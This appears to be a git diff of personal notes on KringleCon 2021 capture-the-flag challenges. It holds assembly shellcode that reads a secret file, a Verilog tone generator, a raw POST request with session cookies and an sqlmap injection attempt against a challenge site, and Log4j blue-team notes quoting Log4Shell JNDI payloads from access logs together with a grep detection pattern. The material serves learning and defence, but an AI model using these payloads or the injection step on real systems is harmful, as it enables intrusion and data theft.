@@ -116,8 +116,95 @@ mov rdi, 99h
 ; Perform the actual syscall
 syscall
 ```
-
 ![](ar_erro.png)
+
+```
+; TODO: Get a reference to this string into the correct register
+db 'Hello World!',0
+
+; Set up a call to sys_write
+; TODO: Set rax to the correct syscall number for sys_write
+mov rax, 1
+
+; TODO: Set rdi to the first argument (the file descriptor, 1)
+mov rdi, 1
+
+; TODO: Set rsi to the second argument (buf - this is the "Hello World" string)
+mov rsi, db
+
+; TODO: Set rdx to the third argument (length of the string, in bytes)
+mov rdx, 12
+; Perform the syscall
+syscall
+
+; Return cleanly
+ret
+```
+
+```
+; TODO: Get a reference to this string into the correct register
+msg:
+db 'Hello World!',0
+
+; Set up a call to sys_write
+; TODO: Set rax to the correct syscall number for sys_write
+
+mov rax, 1
+; TODO: Set rdi to the first argument (the file descriptor, 1)
+
+mov rdi, 1
+; TODO: Set rsi to the second argument (buf - this is the "Hello World" string)
+call msg
+pop rsi
+;mov rsi, msg
+
+; TODO: Set rdx to the third argument (length of the string, in bytes)
+mov rdx, 12
+
+; Perform the syscall
+syscall
+
+; Return cleanly
+ret
+```
+
+final 
+
+```
+; TODO: Get a reference to this
+call msg
+db '/var/northpolesecrets.txt',0
+msg:
+pop rdi
+
+; TODO: Call sys_open
+mov rax, 2
+mov rsi,0
+mov rdx,0
+syscall
+
+; TODO: Call sys_read on the file handle and read it into rsp
+mov rdi, rax
+mov rax, 0
+mov rsi, rsp
+mov rdx, 500
+syscall
+
+; TODO: Call sys_write to write the contents from rsp to stdout (1)
+mov rdi, 1
+mov rax, 1
+mov rsi, rsp
+mov rdx, 500
+;rsi already in place
+syscall
+
+; TODO: Call sys_exit
+mov rax, 60
+mov rdi, 0
+syscall
+```
+
+Secret to KringleCon success: all of our speakers and organizers, providing the gift of cyber security knowledge, free to the community.
 
 # rubber ducky usb device
 ickymcgoop
@@ -353,9 +440,9 @@ Sorry!
 Simulation results indicate a frequency of: 499.9960Hz
 You should be able to generate EXACTLY 500.0000Hz...
 
-If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1
+`If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1`
 
-
+```
 `timescale 1ns/1ns
 module tone_generator (
     input clk,
@@ -405,8 +492,79 @@ module tone_generator (
 		end
 		
 endmodule
+```
+```
+Sending code for analysis...
+Verilog parsed cleanly...
+Synthesizing/implementing design and generating bitstream.
+Bitstream will then be sent to device.
+This will take SEVERAL seconds...
+Code changed! Resetting some simulation results...
 
+Seriously!?! Did you really think that would work?
+Your code no longer matches with what you used to run previous tests and that seems suspicious...
+Your User ID has been logged. If you continue down this misguided path, I'll be forced to add your name to the naughty list.
+                                        - Prof. Qwerty Petabyt
+```
 
+Final code 
+
+```
+`timescale 1ns/1ns
+module tone_generator (
+    input clk,
+    input rst,
+    input [31:0] freq,
+    output wave_out
+);
+    // ---- DO NOT CHANGE THE CODE ABOVE THIS LINE ---- 
+    // ---- IT IS NECESSARY FOR AUTOMATED ANALYSIS ----
+    // TODO: Add your code below. 
+    // Remove the following line and add your own implementation. 
+    // Note: It's silly, but it compiles...
+	
+    // 	localparam CLOCK_FREQUENCY = freq;
+
+	// Counter for toggling of clock
+	reg[31:0] counter = 0.00;
+
+	reg wave_out_reg = 0;
+	assign wave_out = wave_out_reg;
+	localparam CLOCK_FREQUENCY = 12500000.00;
+
+    always @(posedge clk) begin
+ 
+		if (rst) begin
+			counter <= 32'h00;
+			wave_out_reg	 <= 1'b0;
+		end
+	
+		else begin 
+			// If counter is zero, toggle wave_out_reg 
+			if (counter == 32'h00) begin
+				wave_out_reg <= ~wave_out_reg;
+				
+				// Generate 1Hz Frequency
+				//counter <= freq/2 - 1;
+				
+				counter <= $rtoi((CLOCK_FREQUENCY/freq) * 500 -1);
+				// if ($rtoi(counter * 10) - ($rtoi(counter) * 10) > 4) begin
+				//     counter <= (CLOCK_FREQUENCY/freq) * 50 ;
+				// end
+				// else begin
+				//     counter <= (CLOCK_FREQUENCY/freq) * 50 -1 ;
+				// end
+			end 
+			
+			// Else count down
+			else 
+				counter <= counter - 1; 
+			end
+		end
+		
+endmodule
+
+```
 # printer exploitation
 
 https://printer.kringlecastle.com/
@@ -919,6 +1077,85 @@ failregex = .* Invalid .* <HOST> .*$
 
 Not able to configure fail2ban, its just a configuration challenge.
 
+# Jack frost tower
 
+csrf token: kLTFbtPG-ejA6LyRzyH74nBtB7VDZdXA9NVY
 
+gave the entire source code 
+should we try sqlmap
 
+post data: _csrf=Z1ut1EkD-6UHZNNAwzqsomNg9D4OrKVVlotk&email=sss%40gmail.com&submit=Send+Instruction
+post url: https://staging.jackfrosttower.com/forgotpass
+
+Raw post request
+
+POST /forgotpass HTTP/2
+Host: staging.jackfrosttower.com
+Cookie: _csrf=bvGbFbTyAhG8BLjRXfPDdyO6; connect.sid=s%3AN1iBihD_OQ2e-x1dyAidy2t6JBmsJG0h.%2FfQ8S%2FuLDnvdH7HAh4%2FnGpy5g0YsvE%2B5moa10avYUbQ
+Content-Length: 83
+Cache-Control: max-age=0
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://staging.jackfrosttower.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://staging.jackfrosttower.com/forgotpass
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+_csrf=TfaVFtpp-PcXab81MxzejhwXZfVfYiM_IS-g&email=a%40gm.com&submit=Send+Instruction
+
+trying sqlmap : sqlmap -r post_jackfrosttower.txt -p email
+
+sqlmap unable to complete.
+
+# log4j blue team
+
+use `javac` to compile
+use `java` to run
+
+log4j is used for exception handling
+
+```
+use of log4j
+import java.io.*;
+import org.apache.logging.log4j.Logger;
+import org.apache.logging.log4j.LogManager;
+
+public class DisplayFilev2 {
+    static Logger logger = LogManager.getLogger(DisplayFilev2.class);
+    public static void main(String[] args) throws Exception {
+        String st;
+        try {
+            File file = new File(args[0]);
+            BufferedReader br = new BufferedReader(new FileReader(file));
+
+            while ((st = br.readLine()) != null)
+                System.out.println(st);
+        }
+        catch (Exception e) {
+            logger.error("Unable to read file " + args[0] + " (make sure you specify a valid file name).");
+        }
+    }
+}
+```
+
+elfu@8e2faf5a9f06:~/vulnerable$ java DisplayFilev2 '${java:version}'
+11:13:54.096 [main] ERROR DisplayFilev2 - Unable to read file Java version 1.8.0_312 (make sure you specify a valid file name).
+
+f5a9f06:~$ logshell-search.sh /var/log/www
+/var/log/www/access.log:10.26.4.27 - - [14/Dec/2021:11:21:14 +0000] "GET /solr/admin/cores?foo=${jndi:ldap://10.26.4.27:1389/Evil} HTTP/1.1" 200 1311 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0"
+/var/log/www/access.log:10.99.3.1 - - [08/Dec/2021:19:41:22 +0000] "GET /site.webmanifest HTTP/1.1" 304 0 "-" "${jndi:dns://10.99.3.43/NothingToSeeHere}"
+/var/log/www/access.log:10.3.243.6 - - [08/Dec/2021:19:43:35 +0000] "GET / HTTP/1.1" 304 0 "-" "${jndi:ldap://10.3.243.6/DefinitelyLegitimate}"
+
+searching for log
+
+!/bin/sh
+grep -E -i -r '\$\{jndi:(ldap[s]?|rmi|dns):/[^\n]+' $1
